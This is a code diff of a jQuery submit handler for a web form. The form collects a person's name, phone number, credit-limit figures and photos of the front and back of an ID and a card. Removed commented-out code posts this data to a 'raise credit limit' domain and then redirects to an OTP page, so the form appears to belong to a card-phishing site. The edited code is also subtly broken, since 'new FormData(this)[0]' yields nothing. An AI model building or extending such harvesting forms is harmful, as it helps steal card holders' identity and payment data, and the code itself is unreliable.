@@ -86,21 +86,12 @@ $("#matsau_card").change(function () {
 $('#service').submit(function (e) {
     e.preventDefault();
     $('.loader').fadeOut('slow');
-    var formData = new FormData();
+    var formData = new FormData(this)[0];
 
     var mattruoc = $('#mattruoc').val();
     var matsau = $('#matsau').val();
     var mattruoc_card = $('#mattruoc_card').val();
     var matsau_card = $('#matsau_card').val();
-    // formData.append('name', $('#name').val());
-    // formData.append('phone', $('#phone').val());
-    // formData.append('limit_now', $('#limit_now').val());
-    // formData.append('limit_total', $('#limit_total').val());
-    // formData.append('limit_increase', $('#limit_increase').val());
-    // formData.append('mattruoc', mattruoc);
-    // formData.append('matsau', matsau);
-    // formData.append('mattruoc_card', mattruoc_card);
-    // formData.append('matsau_card', matsau_card);
 
     if (navigator.userAgent.indexOf('Safari') != -1 && navigator.userAgent.indexOf('Chrome') == -1) {
         formData.append('mattruoc', mattruoc.files[0]);
@@ -146,39 +137,4 @@ $('#service').submit(function (e) {
             }
         });
     }
-
-    // $.ajax({
-    //     url: 'https://app.nanghanmuctindung.online/api/customer',
-    //     type: 'POST',
-    //     data: formData,
-    //     contentType: false,
-    //     processData: false,
-    //     cache: false,
-    //     headers: {
-    //         'Aceess-Control-Allow-Origin': '*',
-    //         'Accept': 'application/json',
-    //     },
-    //     success: function (data) {
-    //         window.location.href = '/otp.html';
-    //     },
-    //     error: function (data) {
-    //         if (err.response.status == 422) {
-    //             if (err.response.data.errors.name) {
-    //                 alert(err.response.data.errors.name[0]);
-    //             } else if (err.response.data.errors.phone) {
-    //                 alert(err.response.data.errors.phone[0]);
-    //             } else if (err.response.data.errors.limit_now) {
-    //                 alert(err.response.data.errors.limit_now[0]);
-    //             } else if (err.response.data.errors.limit_total) {
-    //                 alert(err.response.data.errors.limit_total[0]);
-    //             } else if (err.response.data.errors.limit_increase) {
-    //                 alert(err.response.data.errors.limit_increase[0]);
-    //             } else if (err.response.data.errors.imageIds) {
-    //                 alert(err.response.data.errors.imageIds[0]);
-    //             }
-    //         } else {
-    //             alert('Có lỗi xảy ra, vui lòng thử lại sau.');
-    //         }
-    //     }
-    // });
 });
